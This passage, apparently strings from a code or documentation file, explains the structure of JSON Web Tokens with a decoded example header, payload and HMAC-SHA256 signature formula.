    "## JWT — JSON Web Tokens",
    "",
    "```",
    "JWT is a compact, self-contained token for stateless authentication.",
    "",
    "Structure (3 base64-encoded parts separated by dots):",
    "  header.payload.signature",
    "",
    "Example (decoded):",
    "  Header:  { alg: 'HS256', typ: 'JWT' }",
    "  Payload: { sub: 'user123', role: 'admin', exp: 1714000000, iat: 1713990000 }",
    "  Signature: HMACSHA256(base64(header) + '.' + base64(payload), secretKey)",
    "",
